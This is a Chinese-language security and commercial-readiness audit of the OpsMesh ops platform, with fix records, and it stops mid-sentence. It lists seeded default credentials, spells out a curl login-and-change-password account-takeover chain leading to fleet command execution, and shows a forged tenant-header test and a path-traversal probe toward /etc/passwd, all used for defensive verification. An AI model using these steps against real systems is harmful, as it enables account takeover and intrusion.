# OpsMesh 商用化就绪度评估报告

> **评估日期**：2026-09-25
> **评估对象**：`F:\Nexus\OpsMesh`（v0.9.0，commit `2c87a0b`）
> **评估视角**：以「能否正式商用交付给企业客户」为准绳，而非「代码质量是否良好」
> **评估方法**：静态阅读 + **实际编译并运行二进制做黑盒验证**（前者读代码，后者跑产品）
> **与既有报告的关系**：`docs/evaluation-report.md`（2026-09-16）已覆盖代码质量维度且标记 35/35 已修复。本报告**不重复**该维度，聚焦其未覆盖的**商用阻断项**，并对其中的错误结论做了实证纠正。

---

## 0. 摘要

**一句话结论**：这是一个**工程量真实、设计有想法、但当前配置下无法交付给客户**的项目。

代码规模与测试投入可观（Go 24.3 万行，测试占 45%），核心机制（真实网段扫描纳管、DAG 编排、版本化迁移、gRPC 适配层）确实落地而非 PPT。但**按文档启动生产模式后，客户既登不进去、又不安全**——这不是代码质量问题，是「产品能不能交出去」的问题。

| 维度 | 评级 | 说明 |
|---|---|---|
| 代码规模与结构 | ★★★★☆ | 24.3 万行，35 个 internal 包，分层清晰 |
| 实现真实性 | ★★★★☆ | 核心功能真实现，非脚手架；网段扫描/SQL 持久化/迁移框架均落地 |
| 测试投入 | ★★★★☆ | 测试占 45%，实测通过；但以 mock 为主，未覆盖真实多副本/并发场景 |
| 安全基线（读代码） | ★★★☆☆ | TLS/JWT/密码策略/SSRF/注入防护齐全，设计意识强 |
| **安全基线（跑起来）** | ★★★☆☆ | 预置弱口令接管与管理员锁死**已修复**（P0-1）；Web 明文 HTTP 与 TLS 静默降级**已修复**（P0-2）；降级姿态显式化且生产默认 HTTPS |
| 多租户隔离 | ★★★★☆ | `users.tenant_id` + JWT 租户声明落库；跨租户下发路径已加统一校验；租户头伪造被拒 |
| 部署可用性 | ★★★★☆ | compose 路径真机跑通；企业版前端由镜像构建期装配进二进制、开箱可用 |
| 升级与灾备 | ★★★★☆ | 迁移加咨询锁 + checksum/版本门禁 + 可重放；18 个 `.down.sql` + 手工回滚手册 |
| 许可与商务机制 | ★★☆☆☆ | Apache-2.0 + 无第三方声明 + 无授权/版本机制（**未修，非技术阻断**） |
| **商用就绪度** | **★★★★☆** | 7 项 P0 + 五项技术类 P1（P1-1/P1-2/P1-3/P1-4/P1-5）均已修复并经真机验证；剩余 P1-6（可支撑性）、P1-7（许可合规） |

**修复到「可商用」的总工作量估算：约 45–65 人天**（不含可选的企业级功能补齐）。其中 6 项 P0 阻断项约 25–40 人天，是唯一必须先做掉的部分。

> **进度（2026-09-25）**：**P0-1 ~ P0-7 七项阻断项已全部修复**，并以真机全栈复验收口（明细见 §2 各自
> 「修复交付物」与 §9 / §10）：
> - 第一批（P0-1/P0-2/P0-4/P0-7）：`deploy.sh up` 退出码 0，17 容器全 Up，端口真实可达，冒烟含
>   「采集目标全 UP」断言全绿；`verify-runtime.sh` **38 项全过**。
> - 第二批（P0-3/P0-5/P0-6，含 P1-8）：重建镜像（内置企业版前端）后重跑，**扩展至 58 项全过**
>   （新增企业版前端交付、压缩协商、迁移版本门禁、租户列落库、租户伪造拒绝等断言）；
>   真实 MySQL 8.0.46 上迁移集成测试 13/13 通过（含整链回滚）。静态门禁 20 项全过。
> - 过程中由「体积/头比对」断言抓出并修复 1 个自查漏网的缺陷：gzip 预压缩旁路把
>   `Content-Encoding` 头值（`gzip`）当文件后缀用，导致 gzip 客户端静默拿到未压缩原文
>   （服务端仍 200，只表现为体积翻 4 倍）。已修并补测试 + 运行时逐编码断言。
> - 第三批（P1-1 / P1-4 / P1-5）：`verify-runtime.sh` **69 项全过**；命令白名单按段校验、无界内存缓冲封顶、
>   指标基数熔断 + `/metrics` CIDR 准入 + 全局限流均经真机复验（含 403 fail-closed 与 429 突发的负向断言，见 §11）。
> - 第四批（P1-3）：`verify-runtime.sh` 扩容至 **86 项全过**（新增第 13 节 19 条审计链专项断言）；
>   在线库完成「改写一行 → 60s 内自检翻转并定位 `first_bad_id` → critical 告警 firing → 还原后自动清零」
>   全周期实证（见 §12.4）。
> - 第五批（P1-2）：`verify-runtime.sh` 扩容至 **94 项全过**（新增第 14 节 8 条 agent 签名/密钥专项断言）；
>   完成「全新纳管 → per-agent 密钥下发落盘 → v2 签名任务真实执行 → 错密钥被拒 → 杀进程重启沿用本机密钥」
>   端到端实证，并实测证明任务子进程读不到签名密钥（见 §13）。
>   **至此 §3 P1 表中技术类高风险项（P1-1/P1-2/P1-3/P1-4/P1-5）全部收口。**
>
> **尚未完成**：P1-6（可支撑性，见 §3）；P1-7 许可与商务机制（非技术阻断）；
> `services/` 双轨收敛（TD-60，路线图阶段四）。

---

## 1. 本次评估的实证方式

上一轮评估是纯静态的（6 维度子代理读代码）。**读代码看不出「跑起来会不会崩」。** 本次补充了黑盒验证：

```
go build -o /tmp/opsmesh-eval ./cmd/opsmesh   → RC=0（90MB）
启动 --production + TLS + JWT + 加密密钥        → 启动成功
HTTP  :18082/healthz                           → 200（明文！）      ← P0-2 复验后：400
HTTPS :18082/healthz                           → 连接失败（无 TLS 监听）← P0-2 复验后：200
curl -H 'X-Tenant-ID: attacker-tenant' /api/v1/devices → 401（租户头伪造被正确拒绝 ✓）
curl 登录 admin/admin123                        → 401 invalid username or password
curl 登录 operator/operator123                  → 200 ← 预置弱口令在生产仍可登录
curl 改密（用已知旧口令）                        → 200 + 返回完整 JWT ← 账号被完全接管
curl /enterprise/（界面上的按钮）                → 404
```

**下列所有 P0/P1 结论均为运行时或代码双重证据，标注了文件与行号。**

---

## 2. P0 阻断项（不修完不可交付）

### P0-1 生产模式下管理员被锁死，且预置弱口令账号可被公开接管 🔴 最严重

> **状态：已修复（2026-09-25）**，代码 + 运行时黑盒复验通过。修复实现见本节末尾「修复交付物」。

**这是本次评估发现的最严重问题，同时也是「产品不可用」和「产品不安全」的叠加。**

**现象 A：管理员无法登录。** 非 demo 模式下启动，`admin` 口令被替换为 32 位随机串，明文**不写日志、不落文件、无 flag 可设**。

```
证据：internal/controlplane/auth_password.go:44-79
      internal/controlplane/server.go:468-469（非 demo 触发轮换）
实测：--mode=controlplane（非 demo）启动日志：
      "[controlplane] 安全提示：默认 admin 密码已替换为随机口令"
      curl 登录 admin/admin123 → 401
      同一日志紧接着提示："请通过 --admin-password-file 或首登获取"
```

**而这两个 flag 根本不存在：**

```
证据：grep -rn 'admin-password-file|admin-password-stdout' 全仓库
      → 仅命中 auth_password.go:75,76,78 三行注释/日志文案本身
      → internal/config/config.go 的 119 个 flag 中无此项
```

即：**运维无法获得管理员口令，也没有任何重置命令、环境变量或文档化的恢复流程。客户拿到的是一台无人能登录的设备。**

**根因（文档与代码互相矛盾的第三处）：**

```
docs/operations.md:288
  | admin 密码 | 固定 admin/admin123 | 随机化（首次启动日志输出） |
                                                ^^^^^^^^^^^^^^^^^^ 已不成立
```

文档承诺「随机化后**首次启动日志输出**」，但该行为正是被 S7 安全修复刻意移除的（`auth_password.go:74-78` 注释明写「S7 修复：不在日志中打印明文密码」）。**安全修复移除了唯一的交付通道，却没有补上替代机制**——注释里写的 `--admin-password-stdout` / `--admin-password-file` 两个 flag 从未实现。这是一次**未完成的安全加固导致的可用性回归**，也解释了为何它能逃过既往 35 项静态自查：每一项单看都「已修复」，但组合起来把产品锁死了。

**现象 B：其他预置账号仍是公开弱口令，且可被完全接管。**

```
证据：internal/store/sql_rbac.go:408-430（种子用户 operator/operator123、viewer/viewer123）
      internal/store/sql_rbac.go:444-448（operatorGroups 含 task → operator 拥有 task:write）
实测（非 demo 模式，全新实例）：
  1. POST /auth/login {"username":"viewer","password":"viewer123"} → 200
     （返回 changePasswordToken，mustChangePassword=true）
  2. POST /auth/change-password
     {"oldPassword":"viewer123","newPassword":"Pwned!2345","changePasswordToken":"<上一步>"}
     → 200，返回完整 JWT（含 permissions 数组）
  → 攻击者仅凭公开仓库里的口令即取得有效会话
```

**为什么这是 P0 而不是中危**：`operator` 角色被授予 `task:write`（`sql_rbac.go:445,458`），而 `task:write` = 向纳管设备下发 shell 任务 = **被管机群上的任意命令执行**。这条链路对任何读过本仓库（Apache-2.0 公开仓库）的人是零门槛的：**读代码 → 拿到口令 → 登录 → 改密 → 获得机群 RCE**。

> 既有评估报告第 7 章将 `operator123` 判为「被强制改密机制中和」（安全子代理同结论），**该结论经实测不成立**：强制改密只阻止了直接调用 API，不阻止用已知旧口令完成改密并取得会话。

**修复方案（约 2–3 人天）**
1. 新增 `--admin-initial-password`（或 `--admin-password-file`），使运维可控；二者至少实现一个，并同时修正 `auth_password.go:75-78` 的误导文案。
2. 轮换范围从「仅 admin」扩展到**全部种子账号**；生产模式若检测到任何种子账号仍为初始口令，**拒绝启动**（fail-fast，与现有 TLS/JWT 校验风格一致）。
3. 提供文档化的口令恢复路径（如 `opsmesh admin reset-password --user admin`），写入 `docs/dr-runbook.md`。
4. 生产模式加一条启动自检：种子账号未改密则告警/拒绝启动。

---

#### 修复交付物（2026-09-25 实施）

**代码**

| 位置 | 改动 |
|---|---|
| `internal/controlplane/auth_password.go` | 删除 `rotateDefaultAdminPassword`（静默锁死），新增 `enforceInitialCredentials` / `deliverAdminCredential` / `revokeSeedCredentials`。admin 弱口令替换后必须经交付通道落地；operator/viewer 的公开弱口令一律替换为随机不可知口令 |
| `internal/controlplane/server.go:468-475` | 非 demo 启动时调用 `enforceInitialCredentials`，返回错误即中止启动（fail-fast） |
| `internal/config/config.go` | 新增 `--admin-password` / `--admin-password-file` / `--admin-password-force-reset`（含 `OPSMESH_ADMIN_PASSWORD` 等 env 映射）；`Validate()` 拒绝「只开恢复开关却不给口令」 |
| `services/auth-svc/cmd/auth-svc/main.go` | 同源缺陷同步修复：`AUTH_SVC_ADMIN_PASSWORD` / `AUTH_SVC_ADMIN_PASSWORD_FILE`，并明确告警「默认日志交付会进日志采集」 |
| `deploy/helm/opsmesh/` | Secret 新增 `admin-password`（显式 > 复用 > 首次随机，随机值前缀 `Aa1` 保证满足强口令校验）；Deployment 注入 `OPSMESH_ADMIN_PASSWORD`；`NOTES.txt` 给出读取命令 |
| `deploy/docker/docker-compose.prod.yml`、`deploy/docker/scripts/deploy.sh`、`deploy/systemd/opsmesh-controlplane.env` | 三条部署路径均接入口令交付通道 |

**行为矩阵（实测）**

| 场景 | 修复前 | 修复后 |
|---|---|---|
| 生产 + 无交付通道 | 启动成功但**无人能登录** | **拒绝启动**，报错指明 `OPSMESH_ADMIN_PASSWORD` / `--admin-password-file` |
| 生产 + `OPSMESH_ADMIN_PASSWORD` | 不适用 | admin 用该口令登录 200 → 首登强制改密 → 拿到正式 JWT |
| 生产 + `--admin-password-file` | 不适用 | 文件（0600）中的随机口令可登录 200 |
| 非生产非 demo | 同上锁死，且无提示 | 随机口令打印到 stderr，开发者不被锁死 |
| demo 模式 | `admin/admin123` 可登录 | 不变（保留一键演示，启动强告警） |
| `operator123` / `viewer123` | 200 登录 → 可完成改密 → 机群 RCE | **401**（启动即替换为随机不可知口令） |

**回归测试**：`internal/controlplane/auth_extra_test.go` 新增 9 个用例（生产无通道 fail-fast、显式口令生效、弱口令拒绝、口令文件 0600、目录缺失报错、幂等不回滚、强制恢复、无 admin 账号、种子账号清除）；`internal/config/security_defaults_test.go` 新增 3 个；`services/auth-svc/cmd/auth-svc/main_test.go` 新增 5 个。受影响包 `go test` 全绿。

**遗留（不在本次修复范围）**：`deploy/docker/index.html` 是遗留冒烟测试页（硬编码 `viewer/viewer123`、回显 token），未被任何 compose 引用，建议删除（见 §3）。

---

### P0-2 生产模式 Web/REST 接口是明文 HTTP，而部署文档宣称已启用 TLS 🔴

> **状态：已修复（2026-09-25）**，代码 + 运行时黑盒复验通过（16/16 断言）。修复实现见本节末尾「修复交付物」。

`--production` 会**强制要求** `--tls-cert`，否则拒绝启动（`config.go:997-1000`），给人一种「已满足等保三级传输加密」的错觉。实际上**该证书只用于 gRPC，浏览器访问的 HTTP 接口全程明文**。

```
证据：internal/controlplane/server_lifecycle.go:319  httpSrv.ListenAndServe()   ← 明文，无 TLS 分支
      internal/controlplane/server.go:50-51,301-302  tlsCert/tlsKey 仅被存储
      internal/controlplane/server_middleware.go:28  当 tlsCert != "" 时注入 HSTS ← 假定自己在跑 HTTPS
实测：--production --tls-cert=/tmp/c.pem ...
      http://127.0.0.1:18082/healthz  → 200
      https://127.0.0.1:18082/healthz → 连接失败（该端口不是 TLS 监听）
```

**并且文档给出了错误的操作指引**，会让运维配出一个连不通的代理：

```
docs/deployment-guide.md:728
  "跨网段建议走 HTTPS（控制面 --tls-cert / --tls-key 启用 HTTP TLS，
   Nginx proxy_pass https://controlplane:8080; + proxy_ssl_verify on;）"
```

而 `README.md` 的 flag 表中 `--tls-cert` 明确定义为「**gRPC** TLS 服务端证书路径」——文档内部自相矛盾，且部署手册那一侧是错的。

**商用影响**：登录口令、JWT、审计数据、任务输出全部明文过网。这直接违反等保三级「通信传输保密性」要求，而产品文档恰恰主打等保三级合规。企业客户的安全评审必然拦下。

**修复方案（约 1–3 人天，二选一）**
- **方案 A（推荐，成本低）**：把 HTTP TLS 做成受控特性或明确排除。修正 `deployment-guide.md:728`，改为明确要求 TLS 在 Nginx/Ingress 终止，并删除「--tls-cert 启用 HTTP TLS」的表述；同时移除 `server_middleware.go` 中基于 `tlsCert` 的 HSTS 注入（避免误导），改为由代理注入。
- **方案 B**：真的实现 HTTP TLS——`--tls-cert` 非空时走 `ListenAndServeTLS`（约 20 行），并让 `--production` 在 HTTP 面向公网时强制要求它。

---

#### 修复交付物（2026-09-25 实施）

采用**方案 B（真做 TLS）并兼容方案 A 的部署形态**：新增 `--http-tls=auto|on|off` 三态开关，把「控制面直供 TLS」与「上游 Ingress 终止 TLS」两种既存部署姿态都变成显式声明，而不是让代码静默选一种。

**代码**

| 位置 | 改动 |
|---|---|
| `internal/config/config.go` | 新增 `HTTPTLS` 字段（`--http-tls` / `OPSMESH_HTTP_TLS`）；`Validate()` 新增三项：非法取值拒绝、`on` 必须配齐 cert+key、**生产模式只有 `--tls-cert` 而无 `--tls-key` 直接拒绝启动**（原先此组合会静默退回 gRPC 明文，是同一处根因里更隐蔽的降级路径） |
| `internal/controlplane/server_netsec.go` | 新增 `buildHTTPTLS()`：`off`→返回 nil（明文）；`auto`→cert+key 齐备才 TLS；`on`→缺证书报错。TLS 配置**复用 `--tls-watch` 的热重载器**（证书轮换对 Web 与 gRPC 同时生效），回退路径走 `tlsutil.HTTPServerTLSConfig`，`MinVersion=TLS1.2` |
| `internal/controlplane/server_lifecycle.go` | Web/REST 监听由裸 `httpSrv.ListenAndServe()` 改为「先 `net.Listen` 再按 scheme 选择 `Serve` / `ServeTLS`」（`:319` 原缺陷点）；启动日志新增 `scheme`/`http_scheme` 字段，明文降级在生产模式打 WARN |
| `cmd/opsmesh/main.go` | `--health` 探针改为 **HTTPS 优先、失败回退 HTTP**（`InsecureSkipVerify`，等价 `curl -k`，仅用于本机存活探测）。否则 compose/k8s 的健康检查在启用 HTTPS 后会全线失败——这是开启 TLS 的连带损害面 |
| `services/auth-svc/` | 不涉及：auth-svc 无 B/S 监听器，本次修复为控制面单侧 |
| `deploy/helm/opsmesh/` | 新增 `controlplane.httpTLS`（默认 `off`，与「TLS 由 Ingress 终止」的既有形态一致并显式化）；`httpTLS=on` 时两个探针自动切 `scheme: HTTPS` |
| `deploy/systemd/opsmesh-controlplane.env` | 补 `OPSMESH_HTTP_TLS` 说明；修正 `OPSMESH_ADVERTISE_ADDR` 由 `http://0.0.0.0:8080`（既非法主机名、又不满足 `pkg/provision/auto.go:91` 生产要求 `https://` 的自动纳管前置条件）为 `https://opsmesh.example.com:8080` |
| `docs/deployment-guide.md` `docs/operations.md` `README.md` | 修正原「`--tls-cert` 启用 HTTP TLS」的错误表述（**这是 P0-2 的文档侧根因**）；补 `--http-tls` 三态语义表、启动失败诊断、生产检查清单 |

**行为矩阵（实测，16/16 断言）**

| 场景 | 修复前 | 修复后 |
|---|---|---|
| 生产 + cert/key + `auto`（默认） | 明文 HTTP，但注入 HSTS、下发 Secure Cookie（进程自认为已 HTTPS） | `https://` 返回 **200** 且证书为所配置者；同一端口发明文 HTTP 返回 **400**（Go 拒绝明文到 TLS 监听）；gRPC TLS 不受影响；`--health` 返回 0 |
| 生产 + cert/key + `off` | 同左（无差别） | 明文 200 + 启动 WARN（指明 Secure Cookie 与 MITM 风险）+ `--health` 回退成功；**姿态显式，不再是意外** |
| 生产 + `on` 但缺 cert/key | 启动成功，静默明文 | **拒绝启动**，报错指明 `--http-tls=on` 需 cert+key |
| 生产 + `--tls-cert` 无 `--tls-key` | 启动成功；gRPC **静默明文** | **拒绝启动**（`--tls-key` 缺失） |
| 非生产默认 | 明文 | 明文（行为不变，不破坏既有开发/演示流程） |
| 上游 Ingress/Nginx 终止 TLS | 文档错误指引 `proxy_pass https://controlplane:8080`（连不通） | 文档改为「控制面 `--http-tls=off` + 代理终止 TLS」，与实际代码一致 |
| 浏览器 `http://` 访问 TLS 端口 | 业务内容正常返回 | 400 拒绝（会话不再经明文外泄的第一道防线） |

**回归测试**：`internal/config/http_tls_test.go` 新增 7 个用例（默认值、flag/env/大小写归一、非法值、`on` 缺证书 ×3、生产 `off` 合法、空值等同 auto、生产 cert 无 key 拒绝）；`internal/controlplane/http_tls_test.go` 新增 7 个（自签 ECDSA P-256 证书夹具 + `httptest` 真 TLS 握手：auto/off/on/非法/空值、复用 `--tls-watch` 热重载器、**真实证书链校验下的 200 与明文非 200**）；`cmd/opsmesh/main_test.go` 新增 2 个（HTTPS 探针成功/非 200）。因新增「生产 cert 无 key 拒绝」规则，同步修正 5 处既有测试夹具补 `TLSKey`。相关包 `go test` 全绿（EXIT=0），`helm template` 三种配置渲染通过。

**说明（为什么不是「二选一」）**：本次评估原建议二选一，但实测发现产品**同时**存在两种真实部署形态——`deploy/docker/*` 让控制面直供端口，`deploy/helm/*` 用 Ingress 终止 TLS。任何单侧硬编码都会打破另一种形态；三态开关使两种姿态都显式、可审计，且生产默认（有证书即 HTTPS）满足等保三级传输加密。

**遗留**：`deploy/docker/docker-compose.prod.yml` 缺证书则无法启动的问题属 P0-4（该文件另有独立缺陷），未在本次范围内。

---

### P0-3 企业版前端（战略 UI）没有任何可交付路径，且随包界面上的入口是 404 🔴

> **状态：已修复（2026-09-25）**，`go:embed` 接线 + 路由 + 镜像构建 + CI 黑盒验收全部落地。
> 修复实现见本节末尾「修复交付物」，镜像内实测证据见 **§10.2**（含 br/gzip 压缩协商与 SPA 回退逐字节一致性）。

产品实际上有**两套前端**：

| 版本 | 位置 | 技术栈 | 是否随二进制交付 |
|---|---|---|---|
| 个人版 | `internal/controlplane/embed/web/` | 原生 ES Module，88 个 .js | ✅ 已 go:embed 进二进制 |
| 企业版 | `web/enterprise/` | Vue3 + Vite，223 个 .js/.vue | ❌ **未嵌入、无路由、未进任何部署资产** |

```
证据：internal/controlplane/server_lifecycle.go:23-24  仅注册 "/" 与 "/assets/"
      grep -rn 'enterprise' --include=*.go internal/ cmd/  → 仅命中注释，无路由注册
      grep -rln 'enterprise' deploy/ docker-compose*.yaml Dockerfile*  → 无任何命中
      web/enterprise/dist/  存在，但 git ls-files 计数 = 0（未入库，本地构建产物）
      web/enterprise/node_modules  不存在
实测：curl http://127.0.0.1:18080/enterprise/      → 404
      curl http://127.0.0.1:18080/enterprise/index.html → 404
```

而个人版首页里有一个醒目的 CTA 指向它：

```html
<!-- internal/controlplane/embed/web/index.html -->
<a class="btn-enterprise" href="/enterprise/">进入企业版前端 →</a>
```

**影响**：按 README「快速启动（零依赖，30 秒）」走的第一个用户，点开浏览器看到的第一个主按钮就是 404。而 `DELIVERY.md` §4.5 用整章篇幅把企业版前端描述为交付主体（13 个子域、1121 个 vitest 用例）。Helm/Compose/K8s 三种部署形态**都不包含它**。客户需要一个「企业版」产品时，拿到的只有一个 gitignored 的 dist 目录和一句「请自行 npm install && npm run build」。

**修复方案（约 3–5 人天）**
1. CI 增加企业版构建 job，产物以 `go:embed` 注入（或独立 nginx 镜像）。
2. Go 侧注册 `/enterprise/` 静态路由并正确设置 `base: '/enterprise/'` 的资源前缀（Vite 已配 `base`，但无服务端）。
3. Helm/Compose 增加前端交付路径（内嵌或 sidecar nginx），并在 `deploy/k8s/` 补齐。
4. 在个人版入口按钮上做兜底：企业版不可用时不展示该链接。

**修复交付物（2026-09-25 实施，方案 1+2+4；弃用方案 3 的 sidecar 路线）**

选择「内嵌进控制面二进制」而非「sidecar nginx」：企业版前端是控制面的 UI，分两个容器会引入
额外的端口/证书/健康检查契约，而 `go:embed` 已经把个人版前端打进去了——同一机制零新增运维面。

1. **`go:embed` 接线**：`internal/controlplane/embed/embed.go` 新增 `EnterpriseFS`（嵌入
   `internal/controlplane/embed/enterprise`）。go:embed 不能跨目录，故产物必须落到该目录，
   由 `deploy/docker/scripts/build-enterprise-web.sh`（`npm ci && npm run build` → 拷贝 dist/）完成组装；
   `make frontend` 已改为调用该脚本（此前只跑 `npm run build`，产物永远进不了二进制——这正是缺陷根因）。
2. **静态路由**：新增 `internal/controlplane/enterprise_ui.go`：
   - `GET /enterprise/` → 外壳；`/enterprise/devices` 等前端路由按 vue-router history 模式
     回退 `index.html`；缺失的前端分包显式 404（不伪装成 HTML，避免 MIME 报错难排查）；
   - `GET /enterprise/assets/*` → 带内容哈希的资源长缓存 `immutable`，`index.html`/`sw.js` 等入口
     `no-cache`；支持 `.br`/`.gz` 预压缩旁路协商（Vary: Accept-Encoding）；
   - 路径穿越（`/enterprise/assets/../..`）一律 404，只读 embed.FS、不回落宿主文件系统；
   - `/enterprise`（无尾斜杠）301 到 `/enterprise/`（否则 Vite 相对资源路径会挂到站点根）。
   - **有意不做租户头校验**：浏览器不会带 `X-Tenant-ID`，且空白外壳必须先渲染出登录页；
     隔离由 `/api/v1/*` 的鉴权承担（外壳内无任何数据）。
3. **未内置时的诚实降级**（方案 4）：产物目录入库一个 `placeholder.html`（含标记），
   `bundleAvailable()` 以「`index.html` 是否存在且不含标记」判定；未内置时
   `/enterprise/` 返回说明页（200 + `X-OpsMesh-Enterprise-Bundle: placeholder`，不是 404），
   且个人版首页的「进入企业版前端 →」入口被服务端自动摘除（HTML 内以
   `<!--OPSMESH_ENTERPRISE_CTA_START/END-->` 包裹，`stripEnterpriseCTA` 处理）。
   这样「源码构建（无 Node）」与「发布镜像」两条路径都不会把用户送到 404。
4. **镜像交付**：`Dockerfile`（CI 发布镜像 / Makefile docker）与 `deploy/docker/Dockerfile.controlplane`
   （`deploy.sh up` / compose）都新增 `node:22-alpine` 构建阶段，产物 `COPY --from=web` 覆盖 embed 目录，
   构建失败即镜像构建失败（不静默降级为占位页）。受限网络可 `--build-arg NPM_REGISTRY=<镜像源>`。
   同步修正 `.dockerignore`：此前整体排除 `web/`，镜像构建根本拿不到前端源码（缺陷的另一半成因）。
5. **CI 防回归**（`frontend` job 扩展）：vitest 通过后组装产物 → 跑 `TestEnterprise*`（真实产物态）
   → 构建二进制并**黑盒启动**，断言 `/enterprise/` 200、外壳引用产物、静态资源 200、
   SPA 回退 200、个人版首页保留入口、且**不得**出现占位页特征。
   占位态的用例由 `build-test` job 的常规 `go test` 覆盖（两态都测）。

**实测收口（2026-09-25，本机二进制 + 真实产物）**：
`GET /enterprise/` 200（`Content-Type: text/html`，`Cache-Control: no-store`，CSP 正常）；
外壳引用 `/enterprise/assets/js/index-DZhQRfLW.js`；该资源 200（37.4KB，
`Accept-Encoding: br` 时 `Content-Encoding: br` + `Vary: Accept-Encoding`，`immutable` 长缓存）；
`GET /enterprise/devices` 200 且与外壳逐字节一致；`GET /enterprise/assets/js/nope.js` 404；
`/enterprise/assets/../../../etc/passwd` 404；个人版 `GET /` 保留 `href="/enterprise/"` 入口且无标记残留。
占位态（临时移除 `index.html`）下 `TestEnterprise*` 同样全绿、入口被摘除、说明页 `未内置`。

---

### P0-4 主要部署资产开箱即坏（客户第一小时就跑不起来）

```
证据：deploy/docker/docker-compose.prod.yml
  - 默认 OPSMESH_PRODUCTION=true，但未传 TLS 证书与 OPSMESH_ENCRYPTION_KEY
    → config.Validate() 拒绝 → cmd/opsmesh/main.go:63 退出码 1 → 容器 CrashLoopBackOff
  - MySQL 启动参数含 MySQL 8.0 已移除的 --query-cache-type=1 → mysqld 自身启动失败
证据：deploy/k8s/ 为半成品：仅 5 个微服务 deployment，无 controlplane / MySQL / Redis
      configmap 设置 OPSMESH_LOG_LEVEL/FORMAT，但无任何 Go 代码读取这两个键
证据：deploy/gitops/ 生产段镜像 tag 钉在 0.7.0，chart 为 0.9.0（版本漂移）
```

**影响**：`docker compose up` 起不来；k8s 路径不可用；GitOps 路径会部署旧版本。Helm Chart 本身质量较好（19 模板、Secret lookup 持久化、备份 CronJob 齐备），但需要手工 override 才能生产用。

**修复方案（约 5–8 人天）**：修 compose.prod 的环境变量与 MySQL 参数；补齐或明确废弃 `deploy/k8s/`；GitOps tag 对齐；CI 增加「部署资产可渲染 + 变量与 config.go 对齐」校验。

#### 修复交付物（2026-09-25 实施，以「真机把生产栈跑起来」为验收）

验收方式不是静态检查，而是反复执行 `deploy/docker/scripts/deploy.sh up` 直到全栈真实起来。
下面 7 个阻断项**全部通过了静态检查**，只在真机启动时才暴露——这也是上一轮「35/35 已修复」
与「compose 起不来」能同时成立的原因：

| # | 症状（真机实测） | 根因 | 修复 |
|---|---|---|---|
| 1 | 微服务镜像构建失败 | 构建上下文必须是仓库根：`services/*/go.mod` 含 `replace opsmesh => ../..`，单服务目录做上下文时容器内无主模块 | compose 统一「根上下文 + `Dockerfile.service` + `--build-arg SERVICE/VERSION`」，与 `release.yml` / `deploy-opsmesh.sh` 同契约 |
| 2 | Loki CrashLoop | 配置按 Loki 2.x 写（`chunk_store_config.max_look_back_period`、`compactor.shared_store`），镜像钉的是 `grafana/loki:3.2.0` | 改为 `limits_config.max_query_lookback` + `compactor.delete_request_store` |
| 3 | otel 配置加载失败 | health_check 扩展用了 0.110.0 已移除的 `exporter_names` 键 | 改为 `exporter_failure_threshold: 5` |
| 4 | otel CrashLoop：`bind: address already in use (8888)` | 0.110.0 内部遥测默认仍监听 `:8888`，与应用侧 prometheus exporter 撞端口 | `service.telemetry.metrics.address: 0.0.0.0:8889`，新增 `otel-collector-internal` 采集 job |
| 5 | otel 恒 `unhealthy`（但进程正常） | distroless 镜像无 shell / 无 wget，`CMD wget` 健康检查无法执行（`executable file not found in $PATH`） | 移除容器内 healthcheck；把 health_check 扩展端口发布到 `127.0.0.1:13134`，由 deploy.sh 从宿主探活 |
| 6 | auth-svc 初始口令引导失败：`must contain at least one special character` | 生成器只满足控制面策略，而 auth-svc 策略更严（≥12 位 + 大小写 + 数字 + 特殊字符） | 统一按「两套策略的并集」生成与预检，不合规 .env 在预检阶段即被拦下 |
| 7 | **13 个容器声明了宿主端口却全部不可达** | `backend_net`/`monitoring_net` 标了 `internal: true`，其上的容器又声明了宿主端口。Docker Desktop(WSL2) 对「所连网络全为 internal」的容器会**静默丢弃** publish：容器 Up/healthy，但 `NetworkSettings.Ports` 为空、`docker port` 无输出、`compose up` 不报任何错 | 去掉两处 `internal: true`；入站边界继续由「端口只发布到 `127.0.0.1`」保证 |

第 7 项的判定依据是下面的对照实验（同一镜像、同一宿主端口、仅网络不同）：

```
--network opsmesh-backend(internal)   → Ports={"9090/tcp":[]}                                curl → 000
--network opsmesh-frontend            → Ports={"9090/tcp":[{"HostIp":"127.0.0.1","HostPort":"28102"}]} curl → 200
--network opsmesh-backend + frontend  → Ports={"9090/tcp":[{"HostIp":"127.0.0.1","HostPort":"28103"}]} curl → 200
```

附带发现（同一根因，属功能不可用而非仅是端口问题）：internal 网络没有网关，**出站 DNS 也不通**。
实测 `opsmesh-alert-svc` 容器内 `getent hosts events.pagerduty.com` 直接解析失败，而 compose 为它
配了 `PAGERDUTY_API_URL=https://events.pagerduty.com/v2/enqueue`——即 PagerDuty 集成在
`internal: true` 下**永远不可能工作**。若确需限制微服务出站，应改用宿主防火墙或 K8s NetworkPolicy。

**防回归**：`deploy/scripts/validate-deploy-assets.sh` 新增硬门禁——凡声明了 `ports` 的服务，
其网络不能全为 `internal: true`（注入 `internal: true` 后门禁实测报出 8 个服务，见 §9）。
该脚本已接入 CI `security` job（`.github/workflows/ci.yml`）。

#### 附带修复：监控栈开箱即产生 5 条 critical 假告警

栈跑起来后查 Prometheus 的 `/api/v1/alerts`，一个**完全健康**的部署上常驻 5 条 critical：

```
firing MySQLDown        job=opsmesh-mysql  severity=critical
firing RedisDown        job=opsmesh-redis  severity=critical
firing ServiceDown      job=opsmesh-redis  severity=critical
firing ServiceDown      job=opsmesh-mysql  severity=critical
firing ServiceDown      job=docker         severity=critical
```

根因两处：
1. `prometheus.yml` 的 `opsmesh-mysql` / `opsmesh-redis` 用了 blackbox_exporter 的协议
   （`metrics_path: /probe` + `params.module: tcp_connect`），但**栈内没有 blackbox-exporter**，
   且 job 缺 `relabel_configs`——等价于让 Prometheus 直接向 MySQL/Redis 发 HTTP `/probe` 请求，
   target 恒 DOWN。
2. `docker` job 指向 `host.docker.internal:9323`，而 dockerd 默认不暴露 `/metrics`
   （需显式配置 `metrics-addr`；Linux 宿主默认也没有 `host.docker.internal` 这个主机名）。

叠加 `prometheus-alerts.yml` 里的 `up == 0` / `MySQLDown` / `RedisDown`，就是永久的红色噪音。
**假告警比不配告警更危险**：它训练值班人员整体忽略告警，真故障会随之被淹没。

修复：新增 `blackbox-exporter`（`prom/blackbox-exporter:v0.25.0` + `deploy/monitoring/blackbox.yml`，
仅内网抓取不发布宿主端口）；给两个拨测 job 补齐标准 `relabel_configs`（`__param_target` /
`instance` / `__address__`）；`docker` job 默认注释并写明启用方式。
`deploy.sh` 冒烟测试新增断言：`up == 0 and (time()-timestamp(up)) < 60` 必须为空，
